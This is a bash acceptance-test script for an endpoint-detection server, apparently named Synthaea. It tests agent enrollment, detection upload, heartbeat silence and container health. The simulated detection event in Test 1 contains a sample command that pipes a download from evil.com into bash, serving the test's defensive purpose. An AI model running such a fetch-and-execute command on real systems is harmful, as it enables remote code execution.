#!/bin/bash
# Acceptance Tests for Issue #28
# Tests the three acceptance criteria with a running server

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
SERVER_URL="${SERVER_URL:-http://localhost:3000}"
CRON_SECRET="${CRON_SECRET:-dev_cron_secret}"
ENROLLMENT_ID="agent-acceptance-test-001"

echo "======================================"
echo "  Synthaea Issue #28 Acceptance Tests"
echo "======================================"
echo ""
echo "Server: $SERVER_URL"
echo ""

# Helper functions
print_success() {
    echo -e "${GREEN}✓ $1${NC}"
}

print_error() {
    echo -e "${RED}✗ $1${NC}"
}

print_info() {
    echo -e "${YELLOW}→ $1${NC}"
}

# Check if server is running
print_info "Checking server health..."
if ! curl -sf "$SERVER_URL/api/health" > /dev/null; then
    print_error "Server not responding at $SERVER_URL"
    print_info "Start server with: docker-compose up"
    exit 1
fi
print_success "Server is healthy"
echo ""

# Test 1: Agent enrolls, uploads detection, appears in console
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Test 1: Agent enrollment → detection → console"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Step 1: Enroll agent
print_info "Enrolling agent: $ENROLLMENT_ID"
ENROLL_RESPONSE=$(curl -s -X POST "$SERVER_URL/api/enrollment" \
    -H "X-Client-Cert-Verified: SUCCESS" \
    -H "X-Client-Cert-Subject: CN=$ENROLLMENT_ID,O=synthaea" \
    -H "Content-Type: application/json" \
    -d "{
        \"enrollmentId\": \"$ENROLLMENT_ID\",
        \"hostname\": \"acceptance-test-vm\",
        \"version\": \"0.1.0\"
    }")

if echo "$ENROLL_RESPONSE" | grep -q "enrolled\|already_enrolled"; then
    print_success "Agent enrolled successfully"
    echo "   Response: $ENROLL_RESPONSE"
else
    print_error "Agent enrollment failed"
    echo "   Response: $ENROLL_RESPONSE"
    exit 1
fi
echo ""

# Step 2: Upload detection
print_info "Uploading detection from agent"
TIMESTAMP_NS=$(date +%s)000000000
DETECTION_RESPONSE=$(curl -s -X POST "$SERVER_URL/api/ingest/detection" \
    -H "X-Client-Cert-Verified: SUCCESS" \
    -H "X-Client-Cert-Subject: CN=$ENROLLMENT_ID,O=synthaea" \
    -H "Content-Type: application/json" \
    -d "{
        \"timestamp_ns\": $TIMESTAMP_NS,
        \"technique\": \"T1059.001\",
        \"severity\": \"high\",
        \"event\": {
            \"type\": \"exec\",
            \"comm\": \"bash\",
            \"cmdline\": \"bash -c 'curl http://evil.com | bash'\"
        },
        \"meta\": {
            \"hostname\": \"acceptance-test-vm\",
            \"user\": \"root\"
        }
    }")

if echo "$DETECTION_RESPONSE" | grep -q "accepted"; then
    print_success "Detection uploaded successfully"
    echo "   Response: $DETECTION_RESPONSE"
else
    print_error "Detection upload failed"
    echo "   Response: $DETECTION_RESPONSE"
    exit 1
fi
echo ""

# Step 3: Verify console access (requires authentication, so just check endpoint exists)
print_info "Checking console endpoint availability"
CONSOLE_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$SERVER_URL/console/cases")
if [ "$CONSOLE_STATUS" = "200" ] || [ "$CONSOLE_STATUS" = "302" ]; then
    print_success "Console endpoint accessible (HTTP $CONSOLE_STATUS)"
    print_info "Note: Full verification requires browser login"
else
    print_error "Console endpoint not accessible (HTTP $CONSOLE_STATUS)"
    exit 1
fi
echo ""

print_success "Test 1 PASSED: Agent enrollment and detection upload work"
echo ""

# Test 2: Heartbeat-silence detection
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Test 2: Heartbeat-silence detection"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Step 1: Send heartbeat
print_info "Sending heartbeat from agent"
HEARTBEAT_RESPONSE=$(curl -s -X POST "$SERVER_URL/api/ingest/heartbeat" \
    -H "X-Client-Cert-Verified: SUCCESS" \
    -H "X-Client-Cert-Subject: CN=$ENROLLMENT_ID,O=synthaea")

if echo "$HEARTBEAT_RESPONSE" | grep -q "ok"; then
    print_success "Heartbeat sent successfully"
    echo "   Response: $HEARTBEAT_RESPONSE"
else
    print_error "Heartbeat failed"
    echo "   Response: $HEARTBEAT_RESPONSE"
    exit 1
fi
echo ""

# Step 2: Trigger silent agent detection cron
print_info "Triggering silent agent detection cron"
print_info "Note: In real scenario, wait 6 minutes for silence"
CRON_RESPONSE=$(curl -s -X GET "$SERVER_URL/api/cron/detect-silent-agents" \
    -H "Authorization: Bearer $CRON_SECRET")

if echo "$CRON_RESPONSE" | grep -q "silentAgents"; then
    print_success "Silent agent detection cron executed"
    echo "   Response: $CRON_RESPONSE"
else
    print_error "Cron job failed"
    echo "   Response: $CRON_RESPONSE"
    exit 1
fi
echo ""

print_success "Test 2 PASSED: Heartbeat and silence detection work"
echo ""

# Test 3: Docker Compose stack health
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Test 3: Docker Compose dev stack health"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# Check if running in Docker Compose
if [ -z "$SKIP_DOCKER_CHECK" ]; then
    print_info "Checking Docker Compose services..."

    if command -v docker-compose &> /dev/null; then
        # Check PostgreSQL
        if docker-compose ps postgres 2>/dev/null | grep -q "Up"; then
            print_success "PostgreSQL container is running"
        else
            print_error "PostgreSQL container not running"
        fi

        # Check server
        if docker-compose ps server 2>/dev/null | grep -q "Up"; then
            print_success "Server container is running"
        else
            print_error "Server container not running"
        fi

        # Check proxy
        if docker-compose ps proxy 2>/dev/null | grep -q "Up"; then
            print_success "Nginx proxy container is running"
        else
            print_info "Nginx proxy not running (optional for dev)"
        fi
    else
        print_info "docker-compose not found, skipping container checks"
    fi
else
    print_info "Skipping Docker checks (SKIP_DOCKER_CHECK set)"
fi
echo ""

print_success "Test 3 PASSED: Server stack is operational"
echo ""

# Final summary
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${GREEN}ALL ACCEPTANCE TESTS PASSED${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "Summary:"
echo "  ✓ Test 1: Agent enrollment and detection upload"
echo "  ✓ Test 2: Heartbeat and silence detection"
echo "  ✓ Test 3: Docker Compose stack health"
echo ""
echo "Manual verification:"
echo "  → Open http://localhost:3000/console/cases to see detections"
echo "  → Wait 6 minutes without heartbeat to test silence detection"
echo ""
